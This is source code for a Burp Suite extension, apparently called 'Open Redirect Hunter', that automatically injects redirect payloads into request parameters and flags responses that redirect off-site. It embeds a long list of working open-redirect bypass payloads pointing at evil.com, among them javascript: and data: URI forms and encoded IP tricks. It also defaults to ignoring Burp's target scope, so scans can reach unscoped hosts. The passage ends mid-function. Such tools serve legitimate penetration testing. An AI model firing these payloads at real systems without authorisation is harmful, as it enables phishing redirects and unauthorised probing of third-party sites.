# -*- coding: utf-8 -*-

from burp import IBurpExtender, IHttpListener, ITab, IScanIssue, IContextMenuFactory, IParameter
from java.io import PrintWriter
from javax.swing import (JPanel, JLabel, JTextField, JButton, BoxLayout, JScrollPane,
                         JTextArea, JCheckBox, SwingConstants)
from java.awt import BorderLayout, Dimension
from java.util import ArrayList
from javax.swing import JMenuItem
from java.net import URL
from java.awt import BorderLayout, Dimension, FlowLayout, GridLayout, Font, Color
from javax.swing import (
    JPanel, JLabel, JTextArea, JScrollPane, JCheckBox, JTextField,
    JButton, SwingConstants, Box
)
from javax.swing.border import TitledBorder, EmptyBorder
from javax.swing import JToggleButton
from urllib import quote, unquote
import threading
import time
import re
try:
    from urlparse import urlparse, parse_qs
except ImportError:
    from urllib.parse import urlparse, parse_qs

class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        self._callbacks.setExtensionName("Open Redirect Hunter")

        self.last_request_time = 0
        self.lock = threading.Lock()
        self.max_threads = 5
        self.max_active_scans = 10
        self.active_threads = []
        self.scanned_requests = set()
        self.vulnerable_params = set()
        self.vulnerable_hosts = set()
        self.dedup_signatures = set()
        self.total_queued = 0
        self.completed_scans = 0
        
        # Initialize whitelisted domains
        self.whitelisted_domains = self.load_setting("whitelisted_domains", [])
        
        # Enhanced payloads with broad bypass coverage (user-provided)
        self.payloads = self.load_setting("payloads", [
            "/%09//evil.com",
            "/%252e%252e/evil.com",
            "//%252e%252e/evil.com",
            "/%255c%255c/evil.com",
            "/%255cevil.com",
            "/%2e%2e/%2e%2e/evil.com",
            "/%2e%2e%2f%2e%2e%2fevil.com",
            "/%2e%2e//evil.com",
            "//%2e%2e/evil.com",
            "///%2e%2e//evil.com",
            "//%2e//evil.com",
            "/..%2f..%2f..%2fevil.com",
            "%2f%2fevil.com",
            "/%2f%2fevil.com",
            "/%2fevil.com/",
            "/..%2fevil.com/",
            "/%5c%5c@evil.com",
            "/%5cevil.com",
            "/%5cevil.com/",
            "/..%5cevil.com/",
            "/%5cevil.com/%2e%2e/",
            "/%5cevil.com%2f",
            "data:text/html,<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">",
            "/....//evil.com",
            "/////evil.com",
            "/////evil.com/",
            "////evil.com",
            "////evil.com/",
            "///@evil.com",
            "///evil.com",
            "///evil.com/",
            "//evil.com",
            "//evil.com/",
            "/\\/\\/evil.com",
            "/\\/\\evil.com/",
            "/\\/evil.com/",
            "/\\evil.com",
            "\\\\evil.com",
            "//evil.com%00",
            "//evil.com/%00/",
            "//evil.com/%09/",
            "//evil.com/%09example.com",
            "//evil.com/%20/",
            "//evil.com/%2e/",
            "//evil.com%2e%2e/",
            "//evil.com/%2e%2e",
            "//evil.com/%2e%2e/",
            "/\\evil.com/%2e%2e",
            "//evil.com/%2e%2e/%2e%2e/",
            "/\\evil.com/%2f..",
            "//evil.com/%5c../",
            "//evil.com?callback=https://evil.com",
            "//evil.com?callbackUrl=https://evil.com",
            "//evil.com?continue=https://evil.com",
            "//evil.com?continueUrl=https://evil.com",
            "//evil.com/?data=https://evil.com",
            "//evil.com?data-url=https://evil.com",
            "//evil.com?dest=https://evil.com",
            "//evil.com?.evil.com",
            "//evil.com?external=https://evil.com",
            "//evil.com?forward=https://evil.com",
            "//evil.com?from=https://evil.com",
            "\\\\evil.com\\@good.com",
            "//evil.com?goto=https://evil.com",
            "//evil.com?jump=https://evil.com",
            "//evil.com&@legit.com",
            "//evil.com@legit.com",
            "//evil.com?navigation=https://evil.com",
            "//evil.com?navigationUrl=https://evil.com",
            "//evil.com?nextPage=https://evil.com",
            "//evil.com?open=https://evil.com",
            "//evil.com?out=https://evil.com",
            "//evil.com?path=https://evil.com",
            "//evil.com#redirect",
            "//evil.com?redirect=https://legit.com",
            "//evil.com#redirect=target.com",
            "//evil.com?redirect_to=https://evil.com",
            "//evil.com?redirect_url=https://evil.com",
            "//evil.com?redir=https://evil.com",
            "//evil.com?return=https://evil.com",
            "//evil.com?returnTo=https://evil.com",
            "//evil.com?r=https://evil.com",
            "//evil.com?site=https://evil.com",
            "///evil.com/?target=https://legit.com",
            "//evil.com?to=https://evil.com",
            "//evil.com?u=https://evil.com",
            "//evil.com?uri=https://evil.com",
            "//evil.com?view=https://evil.com",
            "http://0",
            "http://0.0.0.0@evil.com",
            "http://017700000001",
            "http://0x7f000001",
            "http://0xC0A80001",
            "http://127.0.0.1:80@evil.com",
            "http://2130706433",
            "http://%30%78%63%30%2e%30%78%61%38%2e%30%78%63%30%2e%30%78%36%34/",
            "http://evil.com",
            "http:/\\evil.com",
            "http:/evil.com",
            "http:evil.com",
            "http://evil.com@127.0.0.1",
            "https://127.0.0.1@evil.com",
            "https:%5c%5cevil.com",
            "https://%65%76%69%6c.com",
            "https://evil.com",
            "https://evil.com//",
            "https://evil.com///",
            "https:/evil.com",
            "https:evil.com",
            "https://evil.com%00.example.com",
            "https://evil.com%00@legit.com",
            "https://evil.com%09",
            "https://evil.com%0d%0a",
            "https://evil.com%23@target.com",
            "https://evil.com/%2e%2e",
            "https://evil.com/%2e%2e/",
            "https://evil.com%2f",
            "https://evil.com%2F",
            "https://evil.com%2f%2e%2e",
            "https://evil.com%2f%2e%2e%2f",
            "https://evil.com%3F@target.com",
            "https://evil.com?continue=https://target.com",
            "https://evil.com#@legit.com",
            "https://evil.com?@legit.com",
            "https://evil.com?next=https://target.com",
            "https://evil.com?next=https://target.com#@evil.com",
            "https://evil.com?redirect=https://legit.com",
            "https://evil.com?redirect=https://target.com",
            "https://evil.com?redirect_uri=https://legit.com",
            "https://evil.com#@target",
            "https://evil.com?url=https://target.com#@evil.com",
            "https://legit.com@evil.com",
            "https://localhost@evil.com",
            "https://user:pass@evil.com",
            "javascript:location='https://evil.com'",
            "javascript:window.location.replace('https://evil.com')",
            "//legit.com.evil.com",
            "//login:pass@evil.com",
            "/redirect?url=//evil.com",
            "/redirect?url=https://evil.com"
        ])
        
        # Priority parameters to test
        self.priority_params = [
            "targetUrl", "targeturl", "target_url", "target", "url",
            "redirect_uri", "redirect_url", "redirect", "redir",
            "return_url", "return", "returnto", "return_to",
            "callback", "callback_url", "next", "next_page",
            "goto", "go", "dest", "destination", "continue",
            "forward", "forward_url", "jump", "jump_to", "out",
            "link", "linkurl", "domain", "uri", "path", "location",
            "ref", "referer", "referrer", "view", "load", "fetch",
            "service", "relay", "oauth_callback", "from", "to"
        ]
        
        self.keywords = self.load_setting("keywords", 
            ["url", "redirect", "next", "target", "return", "dest", "goto", "link", "continue", "returnto", "redir", "redirect_uri", "callback"])
        self.delay = float(self._callbacks.loadExtensionSetting("delay") or "2.0")
        self.extension_enabled = (self._callbacks.loadExtensionSetting("enabled") != "false")
        self.scan_post_enabled = (self._callbacks.loadExtensionSetting("scan_post") == "true")
        self.scan_all_enabled = (self._callbacks.loadExtensionSetting("scan_all") == "true")
        self.strict_mode = (self._callbacks.loadExtensionSetting("strict_mode") != "false")
        self.debug_mode = (self._callbacks.loadExtensionSetting("debug_mode") == "true")
        self.recent_proxy_limit = int(self._callbacks.loadExtensionSetting("recent_proxy_limit") or "50")
        self.recent_crawler_limit = int(self._callbacks.loadExtensionSetting("recent_crawler_limit") or "50")
        self.sitemap_batch_size = int(self._callbacks.loadExtensionSetting("sitemap_batch_size") or "50")
        self.use_dynamic_variants = (self._callbacks.loadExtensionSetting("use_dynamic_variants") == "true")
        self.confirm_redirects = (self._callbacks.loadExtensionSetting("confirm_redirects") == "true")
        self.param_miner_enabled = (self._callbacks.loadExtensionSetting("param_miner_enabled") == "true")
        self.max_threads = int(self._callbacks.loadExtensionSetting("max_threads") or "5")
        self.max_active_scans = int(self._callbacks.loadExtensionSetting("max_active_scans") or "10")
        # Default ignore_scope to true so manual requests are scanned even if not added to scope
        self.ignore_scope = (self._callbacks.loadExtensionSetting("ignore_scope") or "true") == "true"
        self.param_types_to_scan = set(
            t for t in [
                IParameter.PARAM_URL,
                IParameter.PARAM_BODY,
                getattr(IParameter, "PARAM_JSON", None),
                getattr(IParameter, "PARAM_XML", None),
                getattr(IParameter, "PARAM_XML_ATTR", None),
                getattr(IParameter, "PARAM_MULTIPART_ATTR", None)
            ] if t is not None
        )

        self.init_gui()
        callbacks.addSuiteTab(self)
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        self.update_status("Extension loaded and ready.")

    def createMenuItems(self, invocation):
        menu = ArrayList()
        request_responses = invocation.getSelectedMessages()
        if not request_responses:
            return None

        menu_item = JMenuItem("Scan with Open Redirect Hunter", 
                            actionPerformed=lambda e: self.manual_scan(request_responses[0]))
        menu.add(menu_item)
        return menu

    def manual_scan(self, messageInfo):
        try:
            request_info = self._helpers.analyzeRequest(messageInfo)
            url = request_info.getUrl()
            method = request_info.getMethod()
            param_source = method
            
            self._stdout.println("[*] Starting manual scan for: %s" % url.toString())
            self.start_scan_thread(url, messageInfo, param_source, is_manual=True)
            self.update_status("Manual scan started for: %s" % url.toString())
        except Exception as e:
            self._stderr.println("[!] Error in manual scan: %s" % str(e))
            import traceback
            self._stderr.println(traceback.format_exc())
            self.update_status("Error during manual scan.")

    def scan_recent_proxy_clicked(self, event):
        try:
            limit = int(self.proxy_limit_field.getText().strip() or "0")
            self.recent_proxy_limit = limit
            self._callbacks.saveExtensionSetting("recent_proxy_limit", str(self.recent_proxy_limit))
            self.scan_recent_proxy(limit)
        except Exception as e:
            self._stderr.println("[!] Error scanning proxy history: %s" % str(e))
            self.update_status("Error scanning proxy history.")

    def scan_recent_crawler_clicked(self, event):
        try:
            limit = int(self.crawler_limit_field.getText().strip() or "0")
            self.recent_crawler_limit = limit
            self._callbacks.saveExtensionSetting("recent_crawler_limit", str(self.recent_crawler_limit))
            self.scan_recent_crawler(limit)
        except Exception as e:
            self._stderr.println("[!] Error scanning crawler history: %s" % str(e))
            self.update_status("Error scanning crawler history.")

    def scan_recent_proxy(self, limit):
        history = self._callbacks.getProxyHistory()
        if not history:
            self.update_status("Proxy history is empty")
            return
        if limit <= 0:
            limit = 50
        recent = history[-limit:]
        self._stdout.println("[*] Queuing %d proxy history items for scan" % len(recent))
        self.enqueue_message_scans(recent, "proxy history")

    def scan_recent_crawler(self, limit):
        site_map_items = self._callbacks.getSiteMap(None)
        if not site_map_items:
            self.update_status("Crawler/site map is empty")
            return
        if limit <= 0:
            limit = 50
        # getSiteMap may return an array; convert to list for slicing
        items = list(site_map_items)[-limit:]
        self._stdout.println("[*] Queuing %d crawler/site map items for scan" % len(items))
        self.enqueue_message_scans(items, "crawler/site map")

    def scan_sitemap_batches_clicked(self, event):
        try:
            batch_size = int(self.sitemap_batch_field.getText().strip() or "0")
            self.sitemap_batch_size = batch_size
            self._callbacks.saveExtensionSetting("sitemap_batch_size", str(self.sitemap_batch_size))
            self.scan_sitemap_in_batches(batch_size)
        except Exception as e:
            self._stderr.println("[!] Error sweeping sitemap: %s" % str(e))
            self.update_status("Error sweeping sitemap.")

    def scan_sitemap_in_batches(self, batch_size):
        site_map_items = self._callbacks.getSiteMap(None)
        if not site_map_items:
            self.update_status("Sitemap empty, nothing to sweep")
            return
        if batch_size <= 0:
            batch_size = 50
        items = list(site_map_items)
        total = len(items)
        self._stdout.println("[*] Sweeping sitemap in batches of %d (total %d)" % (batch_size, total))

        def worker():
            queued_total = 0
            for i in range(0, total, batch_size):
                batch = items[i:i+batch_size]
                batch_queued, batch_skipped = self.enqueue_message_scans(batch, "sitemap batch")
                queued_total += batch_queued
                # short pause to avoid UI bursts; respect rate limiting downstream
                time.sleep(0.5)
            self._stdout.println("[*] Sitemap sweep complete (queued %d)" % queued_total)

        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()

    def enqueue_message_scans(self, messages, label):
        queued = 0
        skipped = 0
        seen_urls = set()
        for msg in messages:
            try:
                request_info = self._helpers.analyzeRequest(msg)
                url = request_info.getUrl()
                if not url or (not self.ignore_scope and not self._callbacks.isInScope(url)):
                    skipped += 1
                    continue
                url_str = url.toString()
                if url_str in seen_urls:
                    skipped += 1
                    continue
                seen_urls.add(url_str)
                sig = self.build_signature(url, request_info.getParameters(), request_info.getMethod())
                if sig and sig in self.dedup_signatures:
                    skipped += 1
                    continue
                if len(self.active_threads) >= self.max_active_scans:
                    skipped += 1
                    continue
                method = request_info.getMethod()
                if method not in ["GET", "POST"]:
                    skipped += 1
                    continue
                param_source = method
                self.start_scan_thread(url, msg, param_source, is_manual=True)
                queued += 1
                if sig:
                    self.dedup_signatures.add(sig)
            except Exception as e:
                skipped += 1
                if self.debug_mode:
                    self._stderr.println("[DEBUG] Skipped %s item: %s" % (label, str(e)))

        self.update_status("Queued %d %s items (skipped %d)" % (queued, label, skipped))
        self._stdout.println("[*] Queued %d %s items (skipped %d)" % (queued, label, skipped))
        return queued, skipped

    def load_setting(self, key, default):
        saved = self._callbacks.loadExtensionSetting(key)
        if saved:
            if isinstance(default, list):
                return [item.strip() for item in saved.strip().split('\n') if item.strip()]
            return saved
        return default

    def parse_int_field(self, text_value, fallback):
        try:
            return int(text_value.strip())
        except Exception:
            if self.debug_mode:
                self._stderr.println("[DEBUG] Invalid int input '%s', using fallback %s" % (text_value, str(fallback)))
            return fallback

    def parse_float_field(self, text_value, fallback):
        try:
            return float(text_value.strip())
        except Exception:
            if self.debug_mode:
                self._stderr.println("[DEBUG] Invalid float input '%s', using fallback %s" % (text_value, str(fallback)))
            return fallback

    def save_settings(self, event):
        try:
            self.payloads = [p.strip() for p in self.payload_area.getText().splitlines() if p.strip()]
            self.keywords = [k.strip().lower() for k in self.keyword_field.getText().split(',') if k.strip()]
            self.whitelisted_domains = [d.strip().lower() for d in self.whitelist_area.getText().splitlines() if d.strip()]
            self.delay = self.parse_float_field(self.rate_field.getText() or "0", self.delay)
            self.extension_enabled = self.toggle_checkbox.isSelected()
            self.scan_post_enabled = self.scan_post_checkbox.isSelected()
            self.scan_all_enabled = self.scan_all_checkbox.isSelected()
            self.recent_proxy_limit = self.parse_int_field(self.proxy_limit_field.getText() or "0", self.recent_proxy_limit)
            self.recent_crawler_limit = self.parse_int_field(self.crawler_limit_field.getText() or "0", self.recent_crawler_limit)
            self.sitemap_batch_size = self.parse_int_field(self.sitemap_batch_field.getText() or "0", self.sitemap_batch_size)
            self.use_dynamic_variants = self.dynamic_variants_checkbox.isSelected()
            self.confirm_redirects = self.confirm_redirects_checkbox.isSelected()
            self.param_miner_enabled = self.param_miner_checkbox.isSelected()
            self.max_threads = max(1, self.parse_int_field(self.max_threads_field.getText() or "1", self.max_threads))
            self.max_active_scans = max(1, self.parse_int_field(self.max_active_scans_field.getText() or "1", self.max_active_scans))
            self.ignore_scope = self.ignore_scope_checkbox.isSelected()
            self.strict_mode = self.strict_mode_checkbox.isSelected()
            self.debug_mode = self.debug_checkbox.isSelected()

            self._callbacks.saveExtensionSetting("payloads", "\n".join(self.payloads))
            self._callbacks.saveExtensionSetting("keywords", ",".join(self.keywords))
            self._callbacks.saveExtensionSetting("whitelisted_domains", "\n".join(self.whitelisted_domains))
            self._callbacks.saveExtensionSetting("delay", str(self.delay))
            self._callbacks.saveExtensionSetting("enabled", "true" if self.extension_enabled else "false")
            self._callbacks.saveExtensionSetting("scan_post", "true" if self.scan_post_enabled else "false")
            self._callbacks.saveExtensionSetting("scan_all", "true" if self.scan_all_enabled else "false")
            self._callbacks.saveExtensionSetting("recent_proxy_limit", str(self.recent_proxy_limit))
            self._callbacks.saveExtensionSetting("recent_crawler_limit", str(self.recent_crawler_limit))
            self._callbacks.saveExtensionSetting("sitemap_batch_size", str(self.sitemap_batch_size))
            self._callbacks.saveExtensionSetting("use_dynamic_variants", "true" if self.use_dynamic_variants else "false")
            self._callbacks.saveExtensionSetting("confirm_redirects", "true" if self.confirm_redirects else "false")
            self._callbacks.saveExtensionSetting("param_miner_enabled", "true" if self.param_miner_enabled else "false")
            self._callbacks.saveExtensionSetting("max_threads", str(self.max_threads))
            self._callbacks.saveExtensionSetting("max_active_scans", str(self.max_active_scans))
            self._callbacks.saveExtensionSetting("ignore_scope", "true" if self.ignore_scope else "false")
            self._callbacks.saveExtensionSetting("strict_mode", "true" if self.strict_mode else "false")
            self._callbacks.saveExtensionSetting("debug_mode", "true" if self.debug_mode else "false")

            self.update_status("Settings saved successfully.")
        except Exception as e:
            self._stderr.println("[!] Error updating settings: %s" % str(e))
            self.update_status("Error saving settings.")

    def init_gui(self):
        self.panel = JPanel(BorderLayout(10, 10))
        self.panel.setBorder(EmptyBorder(10, 10, 10, 10))

        main_panel = JPanel()
        main_panel.setLayout(BoxLayout(main_panel, BoxLayout.Y_AXIS))

        # General Options
        general_panel = JPanel(GridLayout(0, 1, 5, 5))
        general_panel.setBorder(TitledBorder("General Settings"))

        self.toggle_checkbox = JCheckBox("Enable Extension", self.extension_enabled)
        general_panel.add(self.toggle_checkbox)

        self.scan_post_checkbox = JCheckBox("Scan POST requests", self.scan_post_enabled)
        general_panel.add(self.scan_post_checkbox)

        self.scan_all_checkbox = JCheckBox("Scan all parameters (ignore keyword filtering)", self.scan_all_enabled)
        general_panel.add(self.scan_all_checkbox)
        
        self.strict_mode_checkbox = JCheckBox("Strict Mode (reduces false positives)", self.strict_mode)
        general_panel.add(self.strict_mode_checkbox)
        
        self.debug_checkbox = JCheckBox("Debug Mode (verbose logging)", self.debug_mode)
        general_panel.add(self.debug_checkbox)

        self.dynamic_variants_checkbox = JCheckBox("Generate payload variants (double-encode/mixed forms)", self.use_dynamic_variants)
        general_panel.add(self.dynamic_variants_checkbox)

        self.confirm_redirects_checkbox = JCheckBox("Confirm redirects (follow once, detect meta/JS)", self.confirm_redirects)
        general_panel.add(self.confirm_redirects_checkbox)

        self.param_miner_checkbox = JCheckBox("Scan Param Miner-discovered parameters", self.param_miner_enabled)
        general_panel.add(self.param_miner_checkbox)

        self.ignore_scope_checkbox = JCheckBox("Ignore Burp scope (scan all targets)", self.ignore_scope)
        general_panel.add(self.ignore_scope_checkbox)

        main_panel.add(general_panel)

        # Payloads Section
        payload_panel = JPanel(BorderLayout())
        payload_panel.setBorder(TitledBorder("Redirect Payloads"))

        self.payload_area = JTextArea("\n".join(self.payloads), 8, 50)
        self.payload_area.setLineWrap(True)
        self.payload_area.setWrapStyleWord(True)
        scroll_payload = JScrollPane(self.payload_area)
        scroll_payload.setPreferredSize(Dimension(500, 120))
        payload_panel.add(scroll_payload, BorderLayout.CENTER)

        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(payload_panel)
        
        # Whitelist Section
        whitelist_panel = JPanel(BorderLayout())
        whitelist_panel.setBorder(TitledBorder("Whitelisted Domains (one per line)"))
        
        self.whitelist_area = JTextArea("\n".join(self.whitelisted_domains), 4, 50)
        self.whitelist_area.setLineWrap(True)
        self.whitelist_area.setWrapStyleWord(True)
        scroll_whitelist = JScrollPane(self.whitelist_area)
        scroll_whitelist.setPreferredSize(Dimension(500, 60))
        whitelist_panel.add(scroll_whitelist, BorderLayout.CENTER)
        
        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(whitelist_panel)

        # Keywords and Rate Limit
        keyword_panel = JPanel(GridLayout(0, 2, 5, 5))
        keyword_panel.setBorder(TitledBorder("Filtering and Timing"))

        keyword_panel.add(JLabel("Parameter keywords to watch:"))
        self.keyword_field = JTextField(", ".join(self.keywords), 50)
        keyword_panel.add(self.keyword_field)

        keyword_panel.add(JLabel("Rate Limit (seconds between scans):"))
        self.rate_field = JTextField(str(self.delay), 5)
        keyword_panel.add(self.rate_field)

        keyword_panel.add(JLabel("Max active threads:"))
        self.max_threads_field = JTextField(str(self.max_threads), 5)
        keyword_panel.add(self.max_threads_field)

        keyword_panel.add(JLabel("Max active scans:"))
        self.max_active_scans_field = JTextField(str(self.max_active_scans), 5)
        keyword_panel.add(self.max_active_scans_field)

        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(keyword_panel)

        # Actions
        action_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.save_button = JButton("Save Settings", actionPerformed=self.save_settings)
        action_panel.add(self.save_button)

        action_panel.add(JLabel("Recent proxy to scan:"))
        self.proxy_limit_field = JTextField(str(self.recent_proxy_limit), 4)
        action_panel.add(self.proxy_limit_field)
        action_panel.add(JButton("Scan proxy history", actionPerformed=self.scan_recent_proxy_clicked))

        action_panel.add(JLabel("Crawler/Site map:"))
        self.crawler_limit_field = JTextField(str(self.recent_crawler_limit), 4)
        action_panel.add(self.crawler_limit_field)
        action_panel.add(JButton("Scan crawler history", actionPerformed=self.scan_recent_crawler_clicked))

        action_panel.add(JLabel("Sitemap batch size:"))
        self.sitemap_batch_field = JTextField(str(self.sitemap_batch_size), 4)
        action_panel.add(self.sitemap_batch_field)
        action_panel.add(JButton("Sweep sitemap (batches)", actionPerformed=self.scan_sitemap_batches_clicked))

        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(action_panel)

        # Status Label
        self.status_label = JLabel("Status: Ready", SwingConstants.LEFT)
        self.status_label.setBorder(EmptyBorder(5, 5, 5, 5))
        self.status_label.setFont(self.status_label.getFont().deriveFont(Font.BOLD))

        self.panel.add(main_panel, BorderLayout.CENTER)
        self.panel.add(self.status_label, BorderLayout.SOUTH)

    def getTabCaption(self):
        return "Open Redirect Hunter"

    def getUiComponent(self):
        return self.panel

    def update_status(self, message, include_stats=False):
        if include_stats:
            message = "%s (active:%d queued:%d done:%d)" % (message, len(self.active_threads), self.total_queued, self.completed_scans)
        self.status_label.setText("Status: " + message)
        self._stdout.println("[*] " + message)

    def is_host_whitelisted(self, host):
        if not host or not self.whitelisted_domains:
            return False
        host = host.lower()
        for domain in self.whitelisted_domains:
            domain = domain.lower()
            if host == domain or host.endswith("." + domain):
                return True
        return False

    def get_registrable_domain(self, host):
        try:
            # Basic IP detection
            if re.match(r"^\\d{1,3}(\\.\\d{1,3}){3}$", host):
                return host
            labels = host.lower().split(".")
            if len(labels) < 2:
                return host
            # Minimal PSL exceptions for common multi-level TLDs
            psl_2ld = set(["co.uk", "com.au", "com.br", "com.mx", "com.tr", "co.jp", "co.kr", "co.in", "co.nz", "co.za"])
            last_two = ".".join(labels[-2:])
            last_three = ".".join(labels[-3:]) if len(labels) >= 3 else last_two
            if last_two in psl_2ld:
                return ".".join(labels[-3:])
            if last_three in psl_2ld:
                return ".".join(labels[-4:])
            return last_two
        except Exception:
            return host

    def build_signature(self, url, params, method):
        try:
            host = (url.getHost() or "").lower()
            path = url.getPath() or ""
            names = []
            if params:
                for p in params:
                    names.append((p.getName().lower(), p.getType()))
            names = tuple(sorted(names))
            return (host, path, method.lower(), names)
        except Exception:
            return None

    def get_payloads(self):
        base = list(self.payloads)
        if not self.use_dynamic_variants:
            return base
        return self.build_payload_variants(base)

    def build_payload_variants(self, payloads):
        variants = []
        seen = set()

        def add_variant(p):
            if p not in seen:
                seen.add(p)
                variants.append(p)

        for p in payloads:
            if not p:
                continue
            p_clean = p.strip()
            add_variant(p_clean)

            # Double-encode percent sequences
            double_enc = p_clean.replace("%", "%25")
            add_variant(double_enc)

            # Protocol-relative form
            if not p_clean.startswith("//") and not p_clean.startswith("\\\\") and "://" not in p_clean:
                add_variant("//" + p_clean.lstrip("/\\"))

            # Mixed-case scheme variants
            if "://" in p_clean:
                scheme, rest = p_clean.split("://", 1)
                add_variant(scheme.upper() + "://" + rest)
                add_variant(scheme.capitalize() + "://" + rest)

            # Backslash swap variants for traversal/confusion
            add_variant(p_clean.replace("/", "\\"))

        return variants

    def update_content_length(self, request_str):
        parts = request_str.split("\r\n\r\n", 1)
        if len(parts) != 2:
            return request_str

        headers_raw, body = parts
        try:
            body_length = len(body.encode("iso-8859-1"))
        except Exception:
            body_length = len(body)

        new_headers = []
        updated = False
        for header in headers_raw.split("\r\n"):
            if header.lower().startswith("content-length:"):
                new_headers.append("Content-Length: %d" % body_length)
                updated = True
            else:
                new_headers.append(header)

        if body and not updated:
            new_headers.append("Content-Length: %d" % body_length)

        return "\r\n".join(new_headers) + "\r\n\r\n" + body

    def build_mutated_request(self, orig_request_bytes, param, payload):
        """
        Build a mutated request that preserves the original method/body and keeps raw payloads intact.
        Falls back to Burp helpers if offsets are unavailable.
        """
        try:
            request_str = self._helpers.bytesToString(orig_request_bytes)
            value_start = param.getValueStart()
            value_end = param.getValueEnd()
            if value_start >= 0 and value_end >= value_start:
                mutated_str = request_str[:value_start] + payload + request_str[value_end:]
            else:
                mutated_str = request_str

            body_param_types = set(
                t for t in [
                    IParameter.PARAM_BODY,
                    getattr(IParameter, "PARAM_JSON", None),
                    getattr(IParameter, "PARAM_XML", None),
                    getattr(IParameter, "PARAM_XML_ATTR", None),
                    getattr(IParameter, "PARAM_MULTIPART_ATTR", None)
                ] if t is not None
            )

            if param.getType() in body_param_types:
                mutated_str = self.update_content_length(mutated_str)

            return self._helpers.stringToBytes(mutated_str)
        except Exception:
            # Fallback to helper-based mutation if offset replacement fails
            updated_param = self._helpers.buildParameter(param.getName(), payload, param.getType())
            return self._helpers.updateParameter(orig_request_bytes, updated_param)

    def extract_body_redirects(self, body_str):
        results = []
        if not body_str:
            return results

        try:
            meta_matches = re.findall(r'<meta[^>]*http-equiv=["\']?refresh[^>]*content=["\']?\s*\d+\s*;\s*url=([^"\'>\s]+)', body_str, flags=re.IGNORECASE)
            for m in meta_matches:
                results.append((m.strip(), "meta-refresh"))
        except Exception:
            pass

        try:
            js_matches = re.findall(r'(?:location\.href|location\s*|window\.location(?:\.replace|\.assign)?|document\.location)\s*=\s*["\']([^"\']+)["\']', body_str, flags=re.IGNORECASE)
            for m in js_matches:
                results.append((m.strip(), "js-redirect"))
        except Exception:
            pass

        return results

    def confirm_redirect(self, location, original_service, orig_request_bytes):
        try:
            parsed = urlparse(location)
            if not parsed.scheme or not parsed.hostname:
                return False, "Follow skipped (relative or invalid URL)"

            port = parsed.port
            if not port:
                port = 443 if parsed.scheme.lower() == "https" else 80

            service = self._helpers.buildHttpService(parsed.hostname, port, parsed.scheme.lower() == "https")
            request = self._helpers.buildHttpRequest(URL(location))
            response = self._callbacks.makeHttpRequest(service, request)
            if not response or not response.getResponse():
                return False, "Follow-up failed (no response)"

            analyzed = self._helpers.analyzeResponse(response.getResponse())
            status = analyzed.getStatusCode()
            if 300 <= status <= 399:
                return True, "Followed -> %d with redirect" % status
            if status in [200, 201, 204]:
                # Consider success if body still contains redirect scripts
                body_offset = analyzed.getBodyOffset()
                body_str = self._helpers.bytesToString(response.getResponse())[body_offset:]
                alt = self.extract_body_redirects(body_str)
                if alt:
                    return True, "Followed -> %d with inline redirect" % status
            return False, "Followed -> %d (no redirect)" % status
        except Exception as e:
            return False, "Follow-up error: %s" % str(e)

    def is_valid_open_redirect(self, location_header, payload, original_host, param_name=None):
        """
        Enhanced validation to detect advanced open redirect bypasses.
        Returns (is_vulnerable, confidence, reason)
        """
        if not location_header:
            return False, None, None
            
        location_lower = location_header.lower()
        payload_lower = payload.lower()
        try:
            parsed_location = urlparse(location_header)
        except Exception:
            parsed_location = None
        target_host = parsed_location.hostname if parsed_location else None
        target_scheme = parsed_location.scheme if parsed_location else ""
        target_reg = self.get_registrable_domain(target_host) if target_host else None
        original_reg = self.get_registrable_domain(original_host) if original_host else None
        
        # Only consider http/https/protocol-relative redirects
        if target_scheme and target_scheme not in ["http", "https"]:
            # Allow explicit javascript/data/etc. only if the payload asked for it
            if location_lower.startswith(("javascript:", "data:", "vbscript:", "file:", "jar:")):
                return True, "High", "XSS/LFI via %s URI scheme" % location_lower.split(':')[0]
            return False, None, None
        
        if target_host and self.is_host_whitelisted(target_host):
            return False, None, "Target host is whitelisted"
        
        if self.debug_mode:
            self._stdout.println("[DEBUG] Checking location: %s" % location_header)
            self._stdout.println("[DEBUG] Against payload: %s" % payload)
        
        # Decode both for comparison
        try:
            decoded_location = unquote(location_header)
            decoded_payload = unquote(payload)
        except:
            decoded_location = location_header
            decoded_payload = payload
        
        # Extract malicious domains
        evil_domains = ["evil.com", "oast.me", "oast.pro", "oast.live", 
                       "oast.online", "oast.fun", "oast.site", "burpcollaborator.net",
                       "interact.sh", "oastify.com", "canarytokens.com"]
        
        # Infer domains from the payload itself
        payload_domains = set()
        def add_payload_host(candidate):
            variants = set()
            c = candidate.strip()
            variants.add(c)
            if c.startswith("//"):
                variants.add("http:" + c)
            if c.startswith("\\\\"):
                variants.add("http://" + c.replace("\\", "/"))
            if "://" not in c:
                variants.add("http://" + c)
                variants.add("http://" + c.lstrip("/\\"))
            for var in variants:
                try:
                    parsed_payload = urlparse(var)
                    if parsed_payload.hostname:
                        payload_domains.add(parsed_payload.hostname.lower())
                        return
                except Exception:
                    continue

        for candidate in [payload, decoded_payload]:
            add_payload_host(candidate)

        if target_host:
            host_lower = target_host.lower()
            if target_reg and original_reg and target_reg == original_reg:
                return False, None, None

            # If host is simply external (different registrable domain) and not whitelisted, treat as open redirect
            if target_reg and original_reg and target_reg != original_reg and not self.is_host_whitelisted(target_host):
                return True, "High", "External redirect to %s" % target_host

            domain_match = False
            for evil_domain in evil_domains + list(payload_domains):
                if evil_domain and (host_lower == evil_domain or host_lower.endswith("." + evil_domain)):
                    domain_match = True
                    matched_domain = evil_domain
                    break

            if not domain_match:
                # If parameter name indicates redirect and host is external, treat as open redirect
                if param_name:
                    pname = param_name.lower()
                    if any(word in pname for word in self.keywords):
                        return True, "Medium", "External redirect via %s to %s" % (param_name, target_host)
                # Otherwise, if host is simply external and not whitelisted, flag as medium
                if target_reg and original_reg and target_reg != original_reg and not self.is_host_whitelisted(target_host):
                    return True, "Medium", "External redirect to %s" % target_host
